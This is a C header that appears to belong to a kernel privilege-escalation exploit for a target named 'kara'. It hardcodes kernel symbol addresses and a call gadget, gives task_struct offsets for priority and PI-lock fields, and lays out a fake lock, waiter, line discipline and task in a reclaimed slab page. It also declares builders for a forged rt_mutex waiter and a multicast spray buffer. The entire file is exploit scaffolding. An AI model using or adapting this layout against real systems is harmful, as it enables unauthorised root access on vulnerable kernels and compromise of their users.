#ifndef KARA_RECLAIM_LAYOUT_H
#define KARA_RECLAIM_LAYOUT_H

#include <stdint.h>

#define KARA_MM_SLAB_SIZE 0x2000u
#define KARA_RT_WAITER_SIZE 0x30u
#define KARA_MCAST_COPY_SIZE 0x104u

#define KARA_FAKE_LOCK_OFF 0x100u
#define KARA_FAKE_WAITER_OFF 0x140u
#define KARA_FAKE_LDISC_OFF 0x200u
#define KARA_FAKE_TASK_OFF 0x400u

#define KARA_INIT_TASK 0xc120d700u
#define KARA_TTY_LDISCS 0xc14ab9f4u
#define KARA_LDISC_SLOT 20u
#define KARA_LDISC_TARGET (KARA_TTY_LDISCS + KARA_LDISC_SLOT * 4u)
#define KARA_LDISC_CALL_GADGET 0xc05e950cu
#define KARA_TTY_LDISC_MAGIC 0x5403u

#define KARA_TASK_PRIO_OFF 0x30u
#define KARA_TASK_STATIC_PRIO_OFF 0x34u
#define KARA_TASK_NORMAL_PRIO_OFF 0x38u
#define KARA_TASK_DEADLINE_OFF 0x278u
#define KARA_TASK_PI_LOCK_OFF 0x584u
#define KARA_TASK_PI_WAITERS_OFF 0x58cu
#define KARA_TASK_PI_BLOCKED_ON_OFF 0x598u

/* Exact kara disassembly: 0x218 copy depth - 0x1e8 waiter depth. */
#define KARA_MCAST_COPY_DEPTH 0x218u
#define KARA_WAITER_DEPTH 0x1e8u
#define KARA_MCAST_TO_WAITER (KARA_MCAST_COPY_DEPTH - KARA_WAITER_DEPTH)

struct kara_reclaim_addresses {
    uint32_t fake_lock;
    uint32_t fake_waiter;
    uint32_t fake_ldisc;
    uint32_t fake_task;
};

void kara_fill_reclaim_page(uint8_t page[KARA_MM_SLAB_SIZE],
                            uint32_t page_base,
                            struct kara_reclaim_addresses *addresses);
void kara_build_forged_waiter(uint8_t waiter[KARA_RT_WAITER_SIZE],
                              const struct kara_reclaim_addresses *addresses);
void kara_build_tcp_stamp(uint8_t stamp[KARA_MCAST_COPY_SIZE],
                          const struct kara_reclaim_addresses *addresses);

#endif
